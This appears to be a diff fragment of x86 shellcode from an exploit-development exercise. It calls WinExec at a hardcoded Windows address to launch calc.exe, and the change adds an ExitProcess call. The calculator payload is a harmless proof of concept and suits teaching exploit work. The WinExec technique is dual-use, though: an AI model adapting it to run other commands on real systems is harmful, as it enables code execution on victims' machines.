@@ -8,3 +8,5 @@ _payload:
 	push	esp	   	; lpCmdLine = PTR 'calc.exe'
 	mov	eax,0x7c8623ad	; PTR WinExec (via arwin.exe)
 	call	eax
+	mov	eax,0x7c81cafa	; PTR ExitProcess (via arwin.exe)
+	call	eax
